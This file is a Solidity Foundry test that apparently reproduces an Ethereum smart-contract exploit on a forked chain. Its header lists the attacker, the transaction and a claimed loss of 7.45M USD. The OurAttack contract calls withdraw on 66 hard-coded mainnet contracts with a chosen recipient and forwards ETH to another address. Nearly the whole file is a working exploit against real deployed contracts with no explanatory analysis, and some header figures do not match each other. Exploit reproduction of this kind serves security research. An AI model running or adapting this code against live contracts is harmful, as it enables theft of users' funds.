// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : 7.45M USD
// Attacker : 0x5af38735b215b00aa7c9f93fed7ee415cecb36e1
// Attack Contract : 0xb84db016324e8f2bfdd8dd9c260338aee0a8df52
// Vulnerable Contract : 0xb84db016324e8f2bfdd8dd9c260338aee0a8df52
// Attack Tx : 0x2be8704f5a59b69e0b71f64aefdb99eb0e8ae9fb3926147c581910d71bcf3e65
// Block : 25360696
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : beneficial_payout_reproduction
// Reproduced Value : 17.27 USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 25360695;
    uint256 constant TX_TIMESTAMP = 1781981351;
    uint256 constant TX_BLOCK_NUMBER = 25360696;
    uint256 constant TX_VALUE = 10000000000000000;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_FB7476_571B, address(0), Addresses.ZERO, "ETH", 10000000000000000);
    }
}

contract OurAttack {
    function attack() external payable {
        redeemYieldTokens();
    }

    function redeemYieldTokens() internal {
        redeemFirstBatch();
        redeemSecondBatch();
        settleProfit();
    }

    function redeemFirstBatch() internal {
        address[39] memory yieldContracts = [
            Addresses.A_68CA6A_87C6,
            Addresses.A_4EE0B6_31CE,
            Addresses.A_757230_DE39,
            Addresses.A_4DB09F_454A,
            Addresses.A_A61D15_B7C8,
            Addresses.A_33EAF8_C027,
            Addresses.A_32ED8C_00A2,
            Addresses.A_4556DE_A183,
            Addresses.A_5B6466_22FC,
            Addresses.A_69216C_AD0E,
            Addresses.A_0B52DB_B0B3,
            Addresses.A_66A1C9_227C,
            Addresses.A_265EA5_87FD,
            Addresses.A_2E32C1_3FD9,
            Addresses.A_2F34F7_8F82,
            Addresses.A_80BA9B_EAD1,
            Addresses.A_0839BC_B6D7,
            Addresses.A_45C4AE_3255,
            Addresses.A_052CB0_A784,
            Addresses.A_069EAB_90CA,
            Addresses.A_155596_ADA3,
            Addresses.A_F00086_1BC4,
            Addresses.A_320571_938F,
            Addresses.A_083DBF_3C8C,
            Addresses.A_2C5D34_AA25,
            Addresses.A_0691C9_6246,
            Addresses.A_A8AEA3_8DF0,
            Addresses.A_1A5827_4408,
            Addresses.A_1B3021_6412,
            Addresses.A_C1DDE7_1EC9,
            Addresses.A_D7CD30_1417,
            Addresses.A_2FA786_1CC4,
            Addresses.A_0AFFCA_2D0B,
            Addresses.A_B76FA8_DA1A,
            Addresses.A_6976F7_D423,
            Addresses.A_997137_159C,
            Addresses.A_06676D_A2F1,
            Addresses.A_19D29C_9219,
            Addresses.A_8F250D_5499
        ];
        redeemBatch(yieldContracts);
    }

    function redeemSecondBatch() internal {
        address[27] memory yieldContracts = [
            Addresses.A_1C6E9A_304B,
            Addresses.A_7BDFE0_746F,
            Addresses.A_9CDE0D_DB99,
            Addresses.A_B77AEF_1029,
            Addresses.A_74D3C4_882A,
            Addresses.A_0B841C_D1DE,
            Addresses.A_91457D_932B,
            Addresses.A_BFEDE1_B271,
            Addresses.A_6105E0_2D28,
            Addresses.A_48558F_B235,
            Addresses.A_0767FE_D8C9,
            Addresses.A_3935FB_CD28,
            Addresses.A_89D4D1_A4E7,
            Addresses.A_50626A_BE74,
            Addresses.A_13F189_1F59,
            Addresses.A_D2B7BA_E6C9,
            Addresses.A_3DFF87_A672,
            Addresses.A_85FBDA_F211,
            Addresses.A_47BA51_79AC,
            Addresses.A_C6B697_E3A2,
            Addresses.A_0D405C_5E1D,
            Addresses.A_B0D027_4883,
            Addresses.A_68107A_ECF1,
            Addresses.A_2DA736_1388,
            Addresses.A_C81452_8E83,
            Addresses.A_6C6FCB_11D2,
            Addresses.A_D04C31_EA70
        ];
        redeemBatch(yieldContracts);
    }

    function redeemBatch(address[39] memory yieldContracts) internal {
        for (uint256 i = 0; i < yieldContracts.length; i++) {
            IYieldRedeemer(yieldContracts[i]).withdraw(Addresses.A_1F2F10_F387);
        }
    }

    function redeemBatch(address[27] memory yieldContracts) internal {
        for (uint256 i = 0; i < yieldContracts.length; i++) {
            IYieldRedeemer(yieldContracts[i]).withdraw(Addresses.A_1F2F10_F387);
        }
    }

    function settleProfit() internal {
        uint256 nativeTransferAmount = address(this).balance;
        if (nativeTransferAmount > 10000000000000000) nativeTransferAmount = 10000000000000000;
        (bool ok,) = payable(Addresses.A_FB7476_571B).call{value: nativeTransferAmount}("");
        ok;
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0xc269a509) {
            redeemYieldTokens();
            return;
        }
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_052CB0_A784 = 0x052CB08c527C46a65647982D668d8084C980a784;
    address internal constant A_06676D_A2F1 = 0x06676DC6d856ab5C7AA1A836fB0f510616adA2F1;
    address internal constant A_0691C9_6246 = 0x0691C927B0410e04A17A84269De09433911e6246;
    address internal constant A_069EAB_90CA = 0x069eAb79e3bbE25B4d9D6D3fBe9B1f911F4e90cA;
    address internal constant A_0767FE_D8C9 = 0x0767Fef5047dcb47E56E47e543D0b428eA0Dd8C9;
    address internal constant A_0839BC_B6D7 = 0x0839bc34c8be0902CC62c6a008A6c0DD3B4fB6d7;
    address internal constant A_083DBF_3C8C = 0x083DBf9Ae41d5a3380EAFC1537DFb323a7173C8C;
    address internal constant A_0AFFCA_2D0B = 0x0afFcaEF0528458De02bDD39F518903dfD9e2d0b;
    address internal constant A_0B52DB_B0B3 = 0x0b52DB096a26A1b8Cfaab9D92184F289E3E5B0b3;
    address internal constant A_0B841C_D1DE = 0x0b841c47C5F30f4Cc8d1d65B2488E3f3f2b4D1De;
    address internal constant A_0D405C_5E1D = 0x0D405C3387A888FFb67E7FFffc8D40B74b2A5E1d;
    address internal constant A_13F189_1F59 = 0x13f189eCF7cAa267c315917F148b787A4e241f59;
    address internal constant A_155596_ADA3 = 0x155596a9Be8942AFd0f9d368Fbf8089cf02fada3;
    address internal constant A_19D29C_9219 = 0x19D29cd7161cccB5c4AD58286C91bE9997D09219;
    address internal constant A_1A5827_4408 = 0x1A58279496342a1a4889aEb92294947520C44408;
    address internal constant A_1B3021_6412 = 0x1B3021158eCb398964F94B4dCc0C1d29Fd4F6412;
    address internal constant A_1C6E9A_304B = 0x1C6E9a779BaB8E9de13674ab9d604f6D61B3304B;
    address internal constant A_1F2F10_F387 = 0x1f2F10D1C40777AE1Da742455c65828FF36Df387;
    address internal constant A_265EA5_87FD = 0x265ea50A6DED45299c7d8cfa112C125ee14f87fD;
    address internal constant A_2C5D34_AA25 = 0x2c5D342533B6ff53818e2F7770158841abC2aa25;
    address internal constant A_2DA736_1388 = 0x2DA73640d6Fc4dcA145f71D688E4B5C38C491388;
    address internal constant A_2E32C1_3FD9 = 0x2E32C187513E8296917c4c2e6B88Bda7f3ad3FD9;
    address internal constant A_2F34F7_8F82 = 0x2F34f74C3eB35426bb53c0328a54570cFa478F82;
    address internal constant A_2FA786_1CC4 = 0x2fA786BfD298Ee24489435720CB5C306547b1Cc4;
    address internal constant A_320571_938F = 0x320571e2ca822777c18d9405b23aE1A27b08938f;
    address internal constant A_32ED8C_00A2 = 0x32Ed8C7512A4766AC0AAAB4A26a25519159D00A2;
    address internal constant A_33EAF8_C027 = 0x33eaf8c1DACA2bE5F28D556C91d97BfB947fc027;
    address internal constant A_3935FB_CD28 = 0x3935FB260cc2118cA66817fFD57006ebCF6CcD28;
    address internal constant A_3DFF87_A672 = 0x3DFF872C2a7271B5E651CdD1c3FDeeDDABF1a672;
    address internal constant A_3E37F4_65D0 = 0x3e37f4A10d771Ba9dE44b6d301410b1BEdeA65d0;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant A_4556DE_A183 = 0x4556deb2280CA13e5E5109EFc0CE5D89CA8eA183;
    address internal constant A_45C4AE_3255 = 0x45c4ae5CC9C8A0334Fc18c75add87A866EbA3255;
    address internal constant A_47BA51_79AC = 0x47Ba5118F6E9762C7E37897570Ce672c6E6079aC;
    address internal constant A_48558F_B235 = 0x48558f259a6DfbE4A0826c27459b629Dec4Bb235;
    address internal constant A_4DB09F_454A = 0x4dB09fdCE399F331775187Bd81e9eCDFe179454a;
    address internal constant A_4EE0B6_31CE = 0x4EE0B6e9f9C4886bEeef2ebD7fC27223169531CE;
    address internal constant A_50626A_BE74 = 0x50626a53007a0241d1f2924Af0AdBA101dd1be74;
    address internal constant attacker_eoa = 0x5aF38735B215b00aa7C9f93fEd7ee415CeCB36e1;
    address internal constant A_5B6466_22FC = 0x5b646681cf3d4ED2eD1D93D3627Ab6F1374e22FC;
    address internal constant A_6105E0_2D28 = 0x6105e0F02f360Dc699f6D6DA8d5055eD28312d28;
    address internal constant A_66A1C9_227C = 0x66a1C994ed9828D31d60ac9967Ac88859Bcd227C;
    address internal constant A_68107A_ECF1 = 0x68107a7357bDc673606A98cE6947cD12Ca99eCf1;
    address internal constant A_68CA6A_87C6 = 0x68ca6A0c6db92bf2D4424C7c9fba8655992187c6;
    address internal constant A_69216C_AD0E = 0x69216c47C5AAb95F0F90Db3FFa8d16970506Ad0E;
    address internal constant A_6976F7_D423 = 0x6976f79Ffc38579c0845969a867ae8AF81e3d423;
    address internal constant A_6C6FCB_11D2 = 0x6C6fcBEC1ad0a09FC22fAE9c80A72789226911d2;
    address internal constant A_74D3C4_882A = 0x74D3C4534178d72f16Bd6663f69A7b8487f7882A;
    address internal constant A_757230_DE39 = 0x757230bD24489b8d8817f4fF8e5a35Ebeb3DDE39;
    address internal constant A_7BDFE0_746F = 0x7BDfe0a661142F866Ee5521fC5A1470eb04D746F;
    address internal constant A_80BA9B_EAD1 = 0x80ba9B35cf5Db6C56AF43d7925cE8098e32FEad1;
    address internal constant A_85FBDA_F211 = 0x85fBdAf0919DB5CdC66D5b862DAB73c68FdbF211;
    address internal constant A_89D4D1_A4E7 = 0x89d4d1A018Ad6972135A729cDE06f6DCB00Aa4E7;
    address internal constant A_8F250D_5499 = 0x8f250D565d2EAC88B075255A463Aa32034f05499;
    address internal constant A_91457D_932B = 0x91457D6AE5628b06562D6AE5B5AA9aB5b251932B;
    address internal constant A_997137_159C = 0x997137541fD1E480C3405f86cd5E7BbC70E4159C;
    address internal constant A_9CDE0D_DB99 = 0x9Cde0dD4d922e9D0a36077555A89BFfC8c14db99;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant A_A61D15_B7C8 = 0xA61D15479E0aee1fCA32FB0f4F9865102d13b7C8;
    address internal constant A_A8AEA3_8DF0 = 0xa8AEA3ddEE3eF61eDb60B9A57dd84119c5dD8DF0;
    address internal constant A_B0D027_4883 = 0xb0D027Ea6b403965c9169e6Bac7A7017EEc04883;
    address internal constant A_B76FA8_DA1A = 0xb76fa816a8D85B7e3aE0C4f9372DD38510a5Da1A;
    address internal constant A_B77AEF_1029 = 0xb77aEFdE8d6b9023eDc0a1E3c7316475182d1029;
    address internal constant attack_contract = 0xb84db016324e8F2BFdD8DD9c260338AEE0A8DF52;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant A_BFEDE1_B271 = 0xbfede18B40a91118A4C3Ddc7F0Ca7B9e34efB271;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_C1DDE7_1EC9 = 0xc1dDE7D262Eec33fAf8dDBBf4770791800fE1eC9;
    address internal constant A_C6B697_E3A2 = 0xc6b697D8352A0B0Ce033E97518ceF4A79Aa9e3A2;
    address internal constant A_C81452_8E83 = 0xc814520767A1bC279299bD267459597A6E5E8E83;
    address internal constant A_D04C31_EA70 = 0xD04c31cBE66303186F06E1C2870902cDDcc8eA70;
    address internal constant A_D2B7BA_E6C9 = 0xD2B7Ba3720f35e5ef62Ed737d9F414298a15e6c9;
    address internal constant A_D7CD30_1417 = 0xd7cD3037FB05D303552B3760f2D0ee0Effc91417;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant A_F00086_1BC4 = 0xF0008650c7Ddc91Fe58fBe3EeD5479d27e381Bc4;
    address internal constant A_FB7476_571B = 0xFB74767C1ce1aadA0a0E114441173b57f8C1571b;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IYieldRedeemer {
    function withdraw(address account) external;
}
